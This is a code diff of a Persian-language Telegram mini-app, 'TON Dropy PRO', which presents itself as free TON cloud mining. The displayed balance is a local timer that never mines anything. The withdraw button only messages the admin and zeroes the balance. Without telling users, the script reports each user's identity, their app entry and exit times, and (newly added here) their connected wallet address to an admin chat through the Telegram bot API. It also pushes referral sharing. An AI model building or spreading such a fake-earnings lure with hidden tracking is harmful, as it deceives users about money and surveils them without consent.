@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TON Dropy PRO - Live Monitor & Profile</title>
+    <title>TON Dropy PRO - Final Elite</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -14,18 +14,21 @@
         
         body {
             margin: 0; font-family: 'Vazirmatn', sans-serif;
-            background: #070b14; color: #fff; padding: 15px; direction: rtl;
+            background: radial-gradient(circle at top, #0f1c2e, #070b14);
+            color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
         }
 
-        /* استایل پنل پروفایل */
+        /* پنل پروفایل کاربری */
         .profile-card {
-            background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
-            border-radius: 24px; padding: 15px; border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(15px);
+            border-radius: 24px; padding: 18px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
             display: flex; align-items: center; gap: 15px; margin-bottom: 20px;
         }
 
         .avatar-container {
-            width: 60px; height: 60px; border-radius: 50%;
+            width: 65px; height: 65px; border-radius: 50%;
             border: 2px solid #00c6ff; background: #1a1a1a;
             display: flex; align-items: center; justify-content: center; overflow: hidden;
         }
@@ -33,18 +36,19 @@
         .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
         .avatar-container i { font-size: 35px; color: #00c6ff; }
 
-        .user-details h3 { margin: 0; font-size: 16px; color: #00c6ff; }
-        .user-details p { margin: 2px 0; font-size: 11px; color: #aaa; }
+        .user-details h3 { margin: 0; font-size: 17px; color: #fff; font-weight: 800; }
+        .user-details p { margin: 2px 0; font-size: 12px; color: #00c6ff; direction: ltr; text-align: right; }
+        .join-date { font-size: 10px !important; color: #aaa !important; }
 
         /* کارت‌های محتوا */
         .card {
             background: rgba(255, 255, 255, 0.05); border-radius: 25px;
-            padding: 20px; border: 1px solid rgba(255,255,255,0.1);
+            padding: 20px; border: 1px solid rgba(255, 255, 255, 0.1);
             margin-bottom: 15px; text-align: center;
         }
 
         #balance {
-            font-size: 40px; font-weight: 800; color: #00c6ff;
+            font-size: 44px; font-weight: 800; color: #00c6ff;
             display: block; margin: 10px 0;
             text-shadow: 0 0 20px rgba(0, 198, 255, 0.4);
         }
@@ -55,12 +59,12 @@
             display: flex; align-items: center; justify-content: center; gap: 10px;
         }
 
-        #connectBtn { background: #0088cc; color: #fff; margin-bottom: 5px; }
+        #connectBtn { background: #0088cc; color: #fff; }
         #connectBtn.connected { background: #1faa59; }
 
         .withdraw-btn {
             background: linear-gradient(90deg, #ff512f, #dd2476);
-            color: #fff; margin-top: 15px;
+            color: #fff; margin-top: 15px; box-shadow: 0 5px 15px rgba(221, 36, 118, 0.3);
         }
 
         .ref-box {
@@ -75,21 +79,21 @@
 <body>
 
 <div class="profile-card">
-    <div class="avatar-container" id="avatarBox">
-        <i class="fas fa-user-astronaut" id="defaultAvatar"></i>
+    <div class="avatar-container">
+        <i class="fas fa-user-circle" id="defaultAvatar"></i>
         <img id="userPhoto" src="" class="hidden">
     </div>
     <div class="user-details">
-        <h3 id="userName">در حال لود...</h3>
-        <p id="userIdDisplay">آیدی: 0</p>
-        <p id="joinDate">ورود: --/--/--</p>
+        <h3 id="userName">نام کاربر</h3>
+        <p id="userTag">@username</p>
+        <p class="join-date" id="joinDateDisplay">ورود: --/--/--</p>
     </div>
 </div>
 
 <div class="card">
-    <p style="margin:0; font-size:12px; color:#aaa;">موجودی استخراج شده (TON)</p>
+    <p style="margin:0; font-size:12px; color:#aaa;">موجودی قابل برداشت (TON)</p>
     <span id="balance">0.000000</span>
-    <div style="font-size:11px; color:#00ff9d;">⛏ استخراج ابری فعال است</div>
+    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-microchip"></i> استخراج ابری فعال است</div>
 </div>
 
 <div class="card">
@@ -101,8 +105,8 @@
 <div class="card">
     <h4 style="margin:0; color:#00c6ff; font-size: 15px;">👥 دعوت از دوستان</h4>
     <div class="ref-box" id="refLinkDisplay">https://t.me/TonDropyBot?start=ref_...</div>
-    <button onclick="shareLink()" style="background: rgba(255,255,255,0.1); color:#fff;" class="btn-action">
-        <i class="fas fa-share-nodes"></i> اشتراک‌گذاری لینک
+    <button onclick="share()" style="background: rgba(255,255,255,0.1); color:#fff;" class="btn-action">
+        <i class="fas fa-paper-plane"></i> ارسال برای دوستان
     </button>
 </div>
 
@@ -121,30 +125,31 @@
     const ADMIN_ID = "5972276401";
     const BOT_USERNAME = "TonDropyBot";
 
-    // --- تابع ارسال لاگ به ادمین ---
-    function sendLog(type) {
+    // --- تابع ساخت یوزرنیم برای پیام‌های تلگرام ---
+    function formatUser(user) {
+        return user.username ? `@${user.username}` : `<a href="tg://user?id=${user.id}">${user.first_name}</a> (بدون یوزرنیم)`;
+    }
+
+    // --- تابع مانیتورینگ آنلاین/آفلاین ---
+    function sendLog(status) {
         const user = tg.initDataUnsafe?.user;
         if (!user) return;
 
-        const now = new Date().toLocaleString('fa-IR');
-        let text = "";
-        
-        if (type === "login") {
-            text = `🟢 <b>ورود به مینی‌اپ</b>\n👤 کاربر: ${user.first_name}\n🆔 آیدی: <code>${user.id}</code>\n⏰ زمان: ${now}`;
-        } else {
-            text = `🔴 <b>خروج از مینی‌اپ</b>\n👤 کاربر: ${user.first_name}\n🆔 آیدی: <code>${user.id}</code>\n⚠️ وضعیت: آفلاین`;
-        }
+        const time = new Date().toLocaleString('fa-IR');
+        const userLabel = formatUser(user);
+        let text = status === "in" ? 
+            `🟢 <b>ورود به برنامه</b>\n👤 کاربر: ${userLabel}\n⏰ زمان: ${time}` : 
+            `🔴 <b>خروج از برنامه</b>\n👤 کاربر: ${userLabel}\n⚠️ وضعیت: هم‌اکنون آفلاین`;
 
-        // استفاده از keepalive برای اطمینان از ارسال پیام هنگام خروج
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`, { keepalive: true });
     }
 
-    // --- لود پروفایل ---
-    function initApp() {
+    // --- بارگذاری اولیه ---
+    function init() {
         const user = tg.initDataUnsafe?.user;
         if (user) {
-            document.getElementById('userName').innerText = user.first_name + (user.last_name ? " " + user.last_name : "");
-            document.getElementById('userIdDisplay').innerText = "آیدی: " + user.id;
+            document.getElementById('userName').innerText = user.first_name;
+            document.getElementById('userTag').innerText = user.username ? "@" + user.username : "no_username";
             document.getElementById('refLinkDisplay').innerText = `https://t.me/${BOT_USERNAME}?start=ref_${user.id}`;
             
             if (user.photo_url) {
@@ -154,35 +159,34 @@
                 document.getElementById('defaultAvatar').classList.add('hidden');
             }
 
-            let date = localStorage.getItem('join_v15');
+            let date = localStorage.getItem('join_date_final');
             if(!date) {
                 date = new Date().toLocaleDateString('fa-IR');
-                localStorage.setItem('join_v15', date);
+                localStorage.setItem('join_date_final', date);
             }
-            document.getElementById('joinDate').innerText = "ورود: " + date;
+            document.getElementById('joinDateDisplay').innerText = "عضویت: " + date;
 
-            // ارسال لاگ ورود
-            sendLog("login");
+            sendLog("in"); // لاگ ورود
         }
     }
 
-    // ارسال لاگ خروج هنگام بستن صفحه
-    window.addEventListener("pagehide", () => sendLog("logout"));
+    // لاگ خروج
+    window.addEventListener("pagehide", () => sendLog("out"));
 
-    // --- سیستم ماینینگ ---
-    let balance = parseFloat(localStorage.getItem('bal_v15')) || 0;
+    // --- ماینینگ ---
+    let bal = parseFloat(localStorage.getItem('bal_v17')) || 0;
     setInterval(() => {
-        balance += 0.000012;
-        document.getElementById('balance').innerText = balance.toFixed(6);
-        localStorage.setItem('bal_v15', balance.toString());
+        bal += 0.000012;
+        document.getElementById('balance').innerText = bal.toFixed(6);
+        localStorage.setItem('bal_v17', bal.toString());
     }, 1000);
 
-    function shareLink() {
+    function share() {
         const link = document.getElementById('refLinkDisplay').innerText;
-        tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=بیا با هم رایگان TON استخراج کنیم!`);
+        tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=رایگان TON استخراج کن! 💎`);
     }
 
-    // --- کیف پول ---
+    // --- کیف پول و برداشت ---
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json'
     });
@@ -192,6 +196,10 @@
         if(wallet) {
             btn.classList.add('connected');
             btn.innerHTML = '<i class="fas fa-check-circle"></i> متصل شد';
+            
+            const user = tg.initDataUnsafe?.user;
+            const msg = `✅ <b>کیف پول وصل شد</b>\n👤 کاربر: ${formatUser(user)}\n👛 آدرس: <code>${wallet.account.address}</code>`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
         } else {
             btn.classList.remove('connected');
             btn.innerHTML = '<i class="fas fa-wallet"></i> اتصال به کیف پول';
@@ -203,17 +211,16 @@
         else tonConnectUI.openModal();
     };
 
-    // --- برداشت ---
     document.getElementById('withdrawBtn').onclick = () => {
-        if(!tonConnectUI.connected) return tg.showAlert("ابتدا کیف پول را وصل کنید!");
+        if(!tonConnectUI.connected) return tg.showAlert("لطفاً اول کیف پول را وصل کنید!");
         const user = tg.initDataUnsafe?.user;
-        const msg = `💰 <b>درخواست برداشت</b>\n👤 کاربر: ${user?.first_name}\n🆔 آیدی: ${user?.id}\n💵 مقدار: ${balance.toFixed(6)} TON\n👛 آدرس: ${tonConnectUI.account.address}`;
+        const msg = `💰 <b>درخواست برداشت</b>\n👤 کاربر: ${formatUser(user)}\n💵 مقدار: ${bal.toFixed(6)} TON\n👛 آدرس: <code>${tonConnectUI.account.address}</code>`;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
-        tg.showAlert("درخواست با موفقیت ثبت شد ✅");
-        balance = 0; localStorage.setItem('bal_v15', '0');
+        tg.showAlert("درخواست شما با موفقیت ثبت شد ✅");
+        bal = 0; localStorage.setItem('bal_v17', '0');
     }
 
-    initApp();
+    init();
 </script>
 </body>
 </html>
